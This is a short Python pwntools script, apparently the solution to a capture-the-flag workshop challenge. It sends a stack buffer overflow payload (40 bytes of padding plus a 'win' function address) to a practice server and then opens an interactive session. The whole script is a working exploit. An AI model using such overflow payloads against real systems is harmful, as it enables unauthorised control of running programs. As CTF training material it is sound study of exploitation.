from pwn import *

p = remote("ctfworkshop.cybr.club", 3005)

win = p64(0x4011a2)

p.sendline(b'A'*40 + win)
p.sendline(b'')

p.interactive()
